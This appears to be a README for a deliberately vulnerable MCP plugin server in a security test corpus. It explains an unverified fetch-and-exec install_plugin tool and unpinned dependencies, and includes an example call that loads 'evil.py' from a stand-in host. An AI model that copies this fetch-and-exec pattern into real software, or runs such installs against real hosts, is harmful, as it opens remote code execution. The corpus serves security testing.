# supply-chain-yolo — YOLO Plugin Manager

> **⚠ Intentionally vulnerable. Do not deploy.** See
> [SECURITY.md](../../../SECURITY.md). Both runtime sinks are gated: nothing
> here contacts a network or executes remote code unless you explicitly opt in.

**Category:** supply-chain · **Kind:** vulnerable · **Labels:** MCPV-011, MCPV-012

## What it does

| Surface | Signature | Label |
|---|---|---|
| Tool `install_plugin` | `(url: str, name: str) -> str` | MCPV-011 |
| Tool `list_plugins` | `() -> list[str]` | — (support) |
| `requirements.txt` | floating deps, no lockfile | MCPV-012 |

## Why it is vulnerable

**MCPV-011 — fetch and load, unverified.** `install_plugin` takes a caller
URL, fetches it, writes it to the plugin directory, and compiles and executes
it. No host allowlist, no checksum, no signature, no version constraint. The
bytes are trusted because a URL was supplied.

**MCPV-012 — everything floats.** `requirements.txt` pins nothing and has no
lockfile beside it, so the artifact that gets tested is not the artifact that
was reviewed.

### How this challenge stays safe

This is the one corpus entry that models a pattern rather than a live attack,
and it does so explicitly:

- `_fetch` returns a **local inert stub** unless `MCPV_ALLOW_FETCH=1`.
- The `exec` sink is visible in the control flow but **refuses to run** unless
  `MCPV_ALLOW_EXEC=1`.

A static analyser sees `urlopen` feeding `compile`/`exec` with no integrity
check — which is exactly the smell being measured — while running it remains
inert. Neither variable is ever set by the harness or by CI.

## Reproduce

```sh
.venv/bin/python corpus/servers/supply-chain-yolo/server.py
```

Then `install_plugin(url="https://plugins.example.invalid/evil.py", name="evil")`
and inspect the plugin directory. Full steps in `exploits.json`.

## Remediation

Never load code fetched from a URL at runtime. Pin plugins to a signed manifest,
verify a digest, allowlist hosts, and load in a separate least-privilege process.
For dependencies, pin exact versions with hashes and commit a lockfile:

```sh
uv pip compile requirements.in --generate-hashes -o requirements.txt
uv pip install --require-hashes -r requirements.txt
```

## References

- [OWASP LLM03: Supply Chain](https://genai.owasp.org/llmrisk/llm03-supply-chain/)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
